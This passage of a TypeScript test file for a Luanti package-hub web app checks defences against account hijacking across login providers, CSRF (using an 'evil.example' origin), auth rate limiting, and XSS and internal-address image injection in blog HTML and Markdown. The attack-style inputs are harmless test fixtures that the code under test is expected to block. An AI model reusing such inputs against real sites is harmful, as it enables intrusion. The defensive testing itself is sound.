                    const existing = usersTable.find(u => u.id === String(id));
                    if (existing) {
                      existing.display_name = String(display_name);
                      existing.avatar_url = String(avatar_url);
                    } else {
                      usersTable.push({
                        id: String(id),
                        username: String(username),
                        display_name: String(display_name),
                        avatar_url: String(avatar_url),
                        role: String(role)
                      });
                    }
                  } else if (/INSERT INTO user_identities/i.test(norm)) {
                    const [user_id, provider, provider_user_id, provider_username, profile_url, avatar_url, verified] =
                      args;
                    identitiesTable.push({
                      id: nextIdentityId++,
                      user_id: String(user_id),
                      provider: String(provider),
                      provider_user_id: String(provider_user_id),
                      provider_username: String(provider_username),
                      profile_url: String(profile_url || ''),
                      avatar_url: String(avatar_url || ''),
                      verified: verified === undefined ? 1 : Number(verified)
                    });
                  } else if (/UPDATE user_identities/i.test(norm) && args.length >= 7) {
                    const [user_id, provider_user_id, provider_username, profile_url, avatar_url, verified, rowId] =
                      args;
                    const row = identitiesTable.find(i => i.id === Number(rowId));
                    if (row) {
                      row.user_id = String(user_id);
                      row.provider_user_id = String(provider_user_id);
                      row.provider_username = String(provider_username);
                      row.profile_url = String(profile_url || '');
                      row.avatar_url = String(avatar_url || '');
                      row.verified = Number(verified);
                    }
                  }
                  return { success: true };
                }
              };
            }
          };
        }
      };

      const secret = 'sec_collision_guard_secret_999';
      // 4a. Unauthenticated Codeberg PAT login for 'alice' must NOT hijack 'usr_victim_alice'
      const attackerPatRes = await onAuthMePost({
        request: new Request('https://luantihub.org/api/auth/me', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Origin: 'https://luantihub.org' },
          body: JSON.stringify({
            provider: 'codeberg',
            username: 'alice',
            token: 'tok_cb_attacker_alice_1234'
          })
        }),
        env: { DB: mockCollisionDb, SESSION_SECRET: secret }
      } as any);
      expect(attackerPatRes.status).toBe(200);
      const attackerPatJson = await attackerPatRes.json();
      expect(attackerPatJson.userId).not.toBe('usr_victim_alice');
      const attackerCookie = (attackerPatRes.headers.get('Set-Cookie') || '').match(/lh_session=([^;]+)/)?.[1] || '';
      const attackerClaims = await verifySessionTokenClaims(attackerCookie, secret);
      expect(attackerClaims?.userId).toBe(attackerPatJson.userId);
      expect(attackerClaims?.username).toBe('alice_co');
      expect(attackerClaims?.role).toBe('user');
      expect(identitiesTable.filter(i => i.user_id === 'usr_victim_alice').length).toBe(1);

      // 4b. Unauthenticated GitLab OAuth callback for 'alice' must ALSO isolate into 'alice_gl'
      const glState = await createOAuthStateToken('gitlab', secret);
      const attackerOAuthRes = await oauthCallbackGet({
        params: { provider: 'gitlab' },
        request: new Request(
          `https://luantihub.org/api/auth/gitlab/callback?code=gl_collision_code&state=${encodeURIComponent(glState)}`,
          { headers: { Cookie: `lh_oauth_state=${glState}` } }
        ),
        env: {
          DB: mockCollisionDb,
          GITLAB_CLIENT_ID: 'gl_cid',
          GITLAB_CLIENT_SECRET: 'gl_csec',
          SESSION_SECRET: secret
        }
      } as any);
      expect(attackerOAuthRes.status).toBe(302);
      const glCookie = (attackerOAuthRes.headers.get('Set-Cookie') || '').match(/lh_session=([^;]+)/)?.[1] || '';
      const glClaims = await verifySessionTokenClaims(glCookie, secret);
      expect(glClaims?.userId).not.toBe('usr_victim_alice');
      expect(usersTable.some(u => u.username === 'alice_gl' && u.id === glClaims?.userId)).toBe(true);

      // 4c. Authenticated Victim 'alice' linking ContentDB via PAT DOES link onto 'usr_victim_alice'
      const victimSession = await createSessionToken('usr_victim_alice', secret, {
        username: 'alice',
        role: 'admin',
        verified: true
      });
      const victimLinkRes = await onAuthMePost({
        request: new Request('https://luantihub.org/api/auth/me', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Origin: 'https://luantihub.org',
            Cookie: `lh_session=${victimSession}`
          },
          body: JSON.stringify({
            provider: 'contentdb',
            username: 'alice',
            token: 'tok_cdb_victim_alice_5678'
          })
        }),
        env: { DB: mockCollisionDb, SESSION_SECRET: secret }
      } as any);
      expect(victimLinkRes.status).toBe(200);
      const victimLinkJson = await victimLinkRes.json();
      expect(victimLinkJson.userId).toBe('usr_victim_alice');
      expect(
        identitiesTable.some(i => i.user_id === 'usr_victim_alice' && i.provider === 'contentdb' && i.verified === 1)
      ).toBe(true);

      // 5. Defense-in-depth CSRF on POST & PUT /api/auth/me + Dedicated 5 req/min auth_verify rate limit
      const crossSitePost = await onAuthMePost({
        request: new Request('https://luantihub.org/api/auth/me', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'cross-site' },
          body: JSON.stringify({ provider: 'github', username: 'alice', token: 'tok_12345678' })
        }),
        env: { SESSION_SECRET: secret }
      } as any);
      expect(crossSitePost.status).toBe(403);

      const crossOriginPut = await onAuthMePut({
        request: new Request('https://luantihub.org/api/auth/me', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json', Origin: 'https://evil.example' },
          body: JSON.stringify({ bio: 'pwned' })
        }),
        env: { SESSION_SECRET: secret }
      } as any);
      expect(crossOriginPut.status).toBe(403);

      const rateLimitIp = '198.51.100.219';
      for (let i = 1; i <= 5; i++) {
        const mwRes = await edgeMiddleware({
          request: new Request('https://luantihub.org/api/auth/me', {
            method: 'POST',
            headers: { 'CF-Connecting-IP': rateLimitIp, Origin: 'https://luantihub.org' }
          }),
          next: async () => Response.json({ attempt: i }, { status: 401 }),
          env: {}
        });
        expect(mwRes.status).toBe(401);
      }
      const sixthMwRes = await edgeMiddleware({
        request: new Request('https://luantihub.org/api/auth/me', {
          method: 'POST',
          headers: { 'CF-Connecting-IP': rateLimitIp, Origin: 'https://luantihub.org' }
        }),
        next: async () => Response.json({ attempt: 6 }, { status: 401 }),
        env: {}
      });
      expect(sixthMwRes.status).toBe(429);

      // 6. AuthModalComponent UI: Security Guarantee Tooltip, Password-Manager Suppression & Immediate Memory Wipe
      const authService = TestBed.inject(AuthService);
      authService.setSelectedProvider('contentdb');
      const modalFixture = TestBed.createComponent(AuthModalComponent);
      const modalComp = modalFixture.componentInstance;
      modalComp.isDirectSignInExpanded.set(true);
      modalFixture.detectChanges();

      const hostEl = modalFixture.nativeElement as HTMLElement;
      const tokenInputEl = hostEl.querySelector('#auth-token-input') as HTMLInputElement;
      expect(tokenInputEl).toBeTruthy();
      expect(tokenInputEl.getAttribute('data-1p-ignore')).toBe('true');
      expect(tokenInputEl.getAttribute('data-lpignore')).toBe('true');
      expect(tokenInputEl.getAttribute('data-bwignore')).toBe('true');
      expect(tokenInputEl.getAttribute('spellcheck')).toBe('false');

      const scopeHintEl = hostEl.querySelector('[data-testid="auth-token-scope-hint"]') as HTMLElement;
      expect(scopeHintEl?.textContent).toContain('ContentDB');
      authService.setSelectedProvider('github');
      modalFixture.detectChanges();
      expect(scopeHintEl?.textContent).toContain('ZERO scopes');

      // Clicking/tapping the security tooltip button renders zero-storage + revocation guarantees without Admin Secret
      const tooltipBtn = hostEl.querySelector('[data-testid="auth-token-security-tooltip-btn"]') as HTMLButtonElement;
      expect(tooltipBtn).toBeTruthy();
      tooltipBtn.click();
      modalFixture.detectChanges();
      const bodyText = document.body.textContent || '';
      expect(bodyText).toContain('Zero-Storage Security Guarantee');
      expect(bodyText).toContain('write-scoped tokens are rejected');
      expect(bodyText).toContain('revoke');
      expect(bodyText).not.toContain('Admin Secret');
      tooltipBtn.click();

      // Submitting immediately wipes tokenInput & DOM value BEFORE network call resolves
      let resolvePendingLogin!: (val: { success: boolean; message?: string }) => void;
      const loginSpy = vi.spyOn(authService, 'loginWithHandle').mockImplementation(
        () =>
          new Promise(resolve => {
            resolvePendingLogin = resolve;
          })
      );

      modalComp.handleInput = 'alice';
      modalComp.tokenInput = 'ghp_super_secret_ephemeral_token';
      tokenInputEl.value = 'ghp_super_secret_ephemeral_token';

      const signInPromise = modalComp.onDirectSignIn();
      // While the network request is still in-flight, component RAM and DOM input are ALREADY wiped!
      expect(modalComp.tokenInput).toBe('');
      expect(tokenInputEl.value).toBe('');
      expect(loginSpy).toHaveBeenCalledWith('github', 'alice', 'ghp_super_secret_ephemeral_token');

      resolvePendingLogin({ success: false, message: 'Test error' });
      await signInPromise;

      // Destroying the modal also wipes any unsent token typed in the field
      modalComp.tokenInput = 'unsent_secret_token';
      modalFixture.destroy();
      expect(modalComp.tokenInput).toBe('');
      loginSpy.mockRestore();
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should enforce strict HTML/Markdown sanitization, 9-host allowlisted video embeds with zero rawUrl fallback, CSP/CSRF edge defenses, and 6-locale security UX tooltips', async () => {
    const { sanitizeAndFormatBlogHtml } = await import('./core/models/package.model');
    const { buildSafeVideoEmbedUrl, isSafeDirectVideoUrl, extractEmbeddedVideo } = await import(
      './core/config/package-utils.config'
    );
    const { verifySameOriginMutation } = await import('../../functions/api/auth/lib/session');
    const { onRequestPost: onFavoritesPost } = await import('../../functions/api/auth/favorites');
    const { SetupGuideModalComponent } = await import(
      './features/setup-guide/setup-guide-modal.component'
    );

    // 1. Blog HTML sanitization strips <svg>, <math>, event attributes, and non-HTTPS/private images without bypassSecurityTrustHtml
    const cleanedBlog = sanitizeAndFormatBlogHtml(
      '<p>Hello</p><svg onload="void(0)"><circle r="5"/></svg><math><mtext>m</mtext></math><img/onerror="void(0)" src="https://blog.luanti.org/assets/post.png"><img src="http://127.0.0.1/internal.png">',
      'https://blog.luanti.org/2026/11/01/release/'
    );
    expect(cleanedBlog).toContain('https://blog.luanti.org/assets/post.png');
    expect(cleanedBlog).not.toContain('<svg');
    expect(cleanedBlog).not.toContain('<math');
    expect(cleanedBlog).not.toContain('onerror');
    expect(cleanedBlog).not.toContain('127.0.0.1');

    // 2. Multi-host video allowlist supports 9 verified HTTPS ecosystems and NEVER falls back to rawUrl
    expect(buildSafeVideoEmbedUrl('https://youtu.be/dQw4w9WgXcQ')).toContain(
      'https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ'
    );
    expect(buildSafeVideoEmbedUrl('https://piped.video/watch?v=dQw4w9WgXcQ')).toContain(
      'https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ'
    );
    expect(buildSafeVideoEmbedUrl('https://vimeo.com/123456789')).toContain(
      'https://player.vimeo.com/video/123456789?dnt=1'
    );
    expect(
      buildSafeVideoEmbedUrl('https://tilvids.com/w/12345678-1234-1234-1234-123456789abc')
    ).toContain('https://tilvids.com/videos/embed/12345678-1234-1234-1234-123456789abc');
    expect(
      buildSafeVideoEmbedUrl('https://www.twitch.tv/videos/987654321', {
        autoplay: false,
        parentHostname: 'luantihub.org'
      })
    ).toBe('https://player.twitch.tv/?video=987654321&parent=luantihub.org&autoplay=false');
    expect(
      buildSafeVideoEmbedUrl('https://clips.twitch.tv/ImportantSlugName123', {
        autoplay: false,
        parentHostname: 'luantihub.org'
      })
    ).toBe('https://clips.twitch.tv/embed?clip=ImportantSlugName123&parent=luantihub.org&autoplay=false');
    expect(buildSafeVideoEmbedUrl('https://dai.ly/x8abcde', { autoplay: false })).toBe(
      'https://www.dailymotion.com/embed/video/x8abcde?autoplay=0'
    );
    expect(buildSafeVideoEmbedUrl('https://streamable.com/abc1234', { autoplay: false })).toBe(
      'https://streamable.com/e/abc1234?autoplay=0'
    );
    expect(buildSafeVideoEmbedUrl('https://odysee.com/@luanti:1/showcase:2', { autoplay: false })).toBe(
      'https://odysee.com/$/embed/@luanti:1/showcase:2?r=0'
    );
    expect(buildSafeVideoEmbedUrl('https://www.bilibili.com/video/BV1xx411c7mD', { autoplay: false })).toBe(
      'https://player.bilibili.com/player.html?bvid=BV1xx411c7mD&autoplay=0'
    );
    expect(isSafeDirectVideoUrl('https://cdn.content.luanti.org/uploads/trailer.webm')).toBe(true);
    expect(isSafeDirectVideoUrl('http://cdn.content.luanti.org/uploads/trailer.webm')).toBe(false);
    expect(buildSafeVideoEmbedUrl('https://untrusted-iframe-host.example/embed/123')).toBeNull();
    expect(buildSafeVideoEmbedUrl('http://youtube.com/watch?v=dQw4w9WgXcQ')).toBeNull();
    expect(buildSafeVideoEmbedUrl('https://demo.trycloudflare.com/w/12345678-1234-1234-1234-123456789abc')).toBeNull();
    expect(buildSafeVideoEmbedUrl('https://wiki.luanti.org/w/Main_Page')).toBeNull();
    const extractedAfterRepoLink = extractEmbeddedVideo(
      null,
      null,
      'Source: https://github.com/SaKeL/everness and docs https://wiki.luanti.org/w/Main_Page',
      'Showcase clip: https://streamable.com/abc1234'
    );
    expect(extractedAfterRepoLink.video_url).toBe('https://streamable.com/abc1234');

    // 3. PackageDetailModalComponent Markdown & external link guards
    const pkgService = TestBed.inject(PackageService);
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    const samplePkg: LuantiPackage = {
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod',
      short_desc: 'Biomes and structures',
      desc: '![Valid](https://cdn.content.luanti.org/uploads/valid.png)\n![Insecure](http://example.com/bad.png)\n![Local](https://192.168.1.1/lan.png)',
      readme:
        '![Valid](https://cdn.content.luanti.org/uploads/valid.png)\n' +
        '![Mesehub](shot.png)\n' +
        '![BadProxy](/api/packages?proxy_image=http%3A%2F%2F127.0.0.1%2Fsecret.png&ngsw-bypass=true)\n' +
        '![Insecure](http://example.com/bad.png)\n' +
        '![Local](https://192.168.1.1/lan.png)\n' +
        '[QueryLink](https://codeberg.org/SaKeL/everness?foo=1&bar=2)',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 50000,
      license: 'LGPL-2.1-or-later',
      source: 'git',
      repo_url: 'https://git.minetest.land/SaKeL/everness',
      default_branch: 'main',
      tags: ['worldgen'],
      website: 'https://codeberg.org/SaKeL/everness'
    };
    modalComp.package = samplePkg;
    (pkgService as any)._activePackage.set(samplePkg);
    modalFixture.detectChanges();

    const renderedMd = String(modalComp.renderedReadme());
    expect(renderedMd).toContain('https://cdn.content.luanti.org/uploads/valid.png');
    expect(renderedMd).toContain('/api/packages?proxy_image=https%3A%2F%2Fgit.minetest.land%2FSaKeL%2Feverness%2Fraw%2Fbranch%2Fmain%2Fshot.png&amp;ngsw-bypass=true');
    expect(renderedMd).not.toContain('127.0.0.1');
    expect(renderedMd).not.toContain('http://example.com/bad.png');
    expect(renderedMd).not.toContain('192.168.1.1');
    expect(renderedMd).toContain('href="https://codeberg.org/SaKeL/everness?foo=1&amp;bar=2"');
    expect(renderedMd).not.toContain('&amp;amp;');

    const openSpy = vi.spyOn(window, 'open').mockImplementation(() => null);
    const anchorEl = document.createElement('a');
    anchorEl.setAttribute('href', 'https://codeberg.org/SaKeL/everness');
    const clickEvt = new MouseEvent('click', { bubbles: true, cancelable: true, button: 0 });
    Object.defineProperty(clickEvt, 'target', { value: anchorEl });
    modalComp.onMarkdownContentClick(clickEvt);
    expect(clickEvt.defaultPrevented).toBe(true);
    expect(openSpy).toHaveBeenCalledWith('https://codeberg.org/SaKeL/everness', '_blank', 'noopener,noreferrer');
    openSpy.mockRestore();

    expect(modalComp.getSafeExternalHref('https://codeberg.org/SaKeL')).toBe('https://codeberg.org/SaKeL');
    expect(modalComp.getSafeExternalHref('http://insecure.example')).toBeNull();
    expect(modalComp.getSafeExternalHref('https://quick.trycloudflare.com/test')).toBeNull();
    expect(modalComp.getExternalHostLabel('https://www.codeberg.org/SaKeL')).toBe('codeberg.org');
    (pkgService as any)._activePackage.set(null);
    modalFixture.destroy();

    // 4. Edge CSP headers & unified verifySameOriginMutation CSRF protection
    const mwHtmlRes = await edgeMiddleware({
      request: new Request('https://luantihub.org/api/tags', { method: 'GET' }),
      next: async () => Response.json([]),
      env: {}
    });
    expect(mwHtmlRes.headers.get('Content-Security-Policy')).toContain("default-src 'self'");
    expect(mwHtmlRes.headers.get('Content-Security-Policy')).toContain("object-src 'none'");
    expect(mwHtmlRes.headers.get('Content-Security-Policy')).toContain('upgrade-insecure-requests');
    expect(mwHtmlRes.headers.get('Strict-Transport-Security')).toContain('max-age=31536000');
    expect(mwHtmlRes.headers.get('Cross-Origin-Opener-Policy')).toBe('same-origin-allow-popups');
    expect(mwHtmlRes.headers.get('X-Permitted-Cross-Domain-Policies')).toBe('none');

    const mwLocalDevRes = await edgeMiddleware({
      request: new Request('http://localhost:8788/api/tags', { method: 'GET' }),
      next: async () => Response.json([]),
      env: {}
    });
    expect(mwLocalDevRes.headers.get('Strict-Transport-Security')).toBeNull();
    expect(mwLocalDevRes.headers.get('Content-Security-Policy')).not.toContain('upgrade-insecure-requests');
    expect(mwLocalDevRes.headers.get('Content-Security-Policy')).toContain('ws://localhost:*');

    expect(
      verifySameOriginMutation(
        new Request('https://luantihub.org/api/auth/logout', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Origin: 'https://luantihub.org', 'Sec-Fetch-Site': 'same-origin' }
        })
      )
    ).toBeNull();

    expect(
      verifySameOriginMutation(
        new Request('https://luantihub.org/api/auth/logout', {
          method: 'POST',
          headers: { Origin: 'null' }
        })
      )?.status
    ).toBe(403);

    expect(
      verifySameOriginMutation(
        new Request('https://luantihub.org/api/auth/logout', {
          method: 'POST',
          headers: { 'Sec-Fetch-Site': 'same-site' }
        })
      )?.status
    ).toBe(403);

    expect(
      verifySameOriginMutation(
        new Request('https://luantihub.org/api/auth/logout', {
          method: 'POST',
          headers: { 'Sec-Fetch-Mode': 'navigate' }
        })
      )?.status
    ).toBe(403);

    expect(
      verifySameOriginMutation(
        new Request('https://luantihub.org/api/auth/logout', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        })
      )?.status
    ).toBe(403);

    expect(
      verifySameOriginMutation(
        new Request('https://luantihub.org/api/packages/SaKeL/everness?view=1', {
          method: 'POST',
          headers: {
            Origin: 'https://luantihub.org',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'no-cors',
            'Content-Type': 'text/plain;charset=UTF-8'
          }
        }),
        { allowSimpleBeacon: true }
      )
    ).toBeNull();

    // Guest empty/remove favorites calls do NOT insert orphan guest rows into D1 users
    const executedSql: string[] = [];
    const mockDb = {
      prepare: (sql: string) => ({
        bind: () => ({
          run: async () => {
            executedSql.push(sql);
            return { meta: { changes: 0 } };
          },
          all: async () => ({ results: [] })
        })
      })
    };
    const removeFavRes = await onFavoritesPost({
      request: new Request('https://luantihub.org/api/auth/favorites', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Origin: 'https://luantihub.org' },
        body: JSON.stringify({ action: 'remove', packageId: 'SaKeL/everness', clientId: 'guest_1234567890' })
      }),
      env: { DB: mockDb }
    });
    expect(removeFavRes.status).toBe(200);
    expect(executedSql.some(s => s.includes('INSERT OR IGNORE INTO users'))).toBe(false);

    // 5. Installed PWA OAuth uses single-window 302 redirect (never window.open floating popup) and preserves return_to
    const authService = TestBed.inject(AuthService);
    const pwaService = TestBed.inject(PwaService);
    pwaService.isInstalled.set(true);
    (authService as any)._oauthProviders.set({ github: true });
    (authService as any)._isOAuthRedirecting.set(false);
    authService.selectProfileDrawerTab('account', false);
    (authService as any)._isProfileDrawerOpen.set(true);

    const winOpenSpy = vi.spyOn(window, 'open');
    const navUrlSpy = vi.spyOn(authService as any, 'navigateToUrl').mockImplementation(() => {});

    authService.loginWith('github', 'sakel-hub', true);
    expect(winOpenSpy).not.toHaveBeenCalled();
    expect(navUrlSpy).toHaveBeenCalledTimes(1);
    const redirectLoginUrl = String(navUrlSpy.mock.calls[0][0]);
    expect(redirectLoginUrl).toContain('/api/auth/github/login?');
    expect(redirectLoginUrl).not.toContain('popup=1');
    expect(redirectLoginUrl).toContain('return_to=%2Fprofile%3Ftab%3Daccount');

    // Verify /api/auth/github/login -> /api/auth/github/callback round-trip preserves return_to via 302 redirect
    const { onRequestGet: onLoginGet } = await import('../../functions/api/auth/[provider]/login');
    const { onRequestGet: onCallbackGet } = await import('../../functions/api/auth/[provider]/callback');
    const loginRes = await onLoginGet({
      params: { provider: 'github' },
      request: new Request(`https://luantihub.org${redirectLoginUrl}`),
      env: {
        GITHUB_CLIENT_ID: 'gh_client_test',
        SESSION_SECRET: 'test-edge-secret-32chars-minimum!!'
      }
    });
    expect(loginRes.status).toBe(302);
    const ghAuthLoc = new URL(loginRes.headers.get('Location') || '');
    const signedState = ghAuthLoc.searchParams.get('state') || '';
    expect(signedState.length).toBeGreaterThan(10);

    const cancelCbRes = await onCallbackGet({
      params: { provider: 'github' },
      request: new Request(
        `https://luantihub.org/api/auth/github/callback?state=${encodeURIComponent(signedState)}`,
        { headers: { Cookie: `lh_oauth_state=${encodeURIComponent(signedState)}` } }
      ),
      env: {
        GITHUB_CLIENT_ID: 'gh_client_test',
        GITHUB_CLIENT_SECRET: 'gh_secret_test',
        SESSION_SECRET: 'test-edge-secret-32chars-minimum!!'
      }
    });
    expect(cancelCbRes.status).toBe(302);
    expect(cancelCbRes.headers.get('Location')).toBe(
      'https://luantihub.org/profile?tab=account&auth_error=auth_cancelled&provider=github'
    );

    (authService as any)._isOAuthRedirecting.set(false);
    (authService as any)._isProfileDrawerOpen.set(false);
    pwaService.isInstalled.set(false);
    winOpenSpy.mockRestore();
    navUrlSpy.mockRestore();

    // 6. Security UX badges/tooltips, Legal Modal Section 4 & Footer /LICENSE.txt link
    const authModalFix = TestBed.createComponent(AuthModalComponent);
    authModalFix.detectChanges();
    expect(authModalFix.nativeElement.querySelector('[data-testid="oauth-security-pill"]')).toBeTruthy();
    authModalFix.destroy();

    const setupFix = TestBed.createComponent(SetupGuideModalComponent);
    setupFix.detectChanges();
    expect(setupFix.nativeElement.querySelector('[data-testid="setup-security-badge"]')).toBeTruthy();
    setupFix.destroy();

    const submitFix = TestBed.createComponent(SubmitModalComponent);
    submitFix.componentInstance.auditReport.set({
      valid: true,
      configFound: 'mod.conf',
      luacheckPassed: true,
      licenseValid: true,
      diagnostics: []
    });
    submitFix.detectChanges();
    expect(submitFix.nativeElement.querySelector('[data-testid="audit-pill-conf"]')).toBeTruthy();
    expect(submitFix.nativeElement.querySelector('[data-testid="audit-pill-luacheck"]')).toBeTruthy();
    expect(submitFix.nativeElement.querySelector('[data-testid="audit-pill-license"]')).toBeTruthy();
    expect(submitFix.nativeElement.querySelector('[data-testid="audit-pill-owner"]')).toBeTruthy();
    submitFix.destroy();

    (authService as any)._currentUser.set({
      id: 'usr_sec_test',
      username: 'sakel',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'user',
      identities: [{ provider: 'codeberg', username: 'SaKeL', verified: true }]
    });
    (authService as any)._isProfileDrawerOpen.set(true);
    const profileFix = TestBed.createComponent(ProfileDrawerComponent);
    profileFix.componentInstance.activeTab.set('account');
    profileFix.detectChanges();
    expect(
      profileFix.nativeElement.querySelector('[data-testid="connected-accounts-security-btn"]')
    ).toBeTruthy();
    profileFix.destroy();
    (authService as any)._isProfileDrawerOpen.set(false);
    (authService as any)._currentUser.set(null);
    (authService as any)._currentUser.set(null);

    const appFix = TestBed.createComponent(App);
    pkgService.openLegalModal();
    appFix.detectChanges();
    const appEl = appFix.nativeElement as HTMLElement;
    expect(appEl.querySelector('[data-testid="legal-security-architecture-section"]')).toBeTruthy();
    const footerLicenseLink = appEl.querySelector('[data-testid="footer-license-link"]') as HTMLAnchorElement;
    expect(footerLicenseLink).toBeTruthy();
    expect(footerLicenseLink.getAttribute('href')).toBe('/LICENSE.txt');
    pkgService.closeLegalModal();
    appFix.destroy();
  });
});
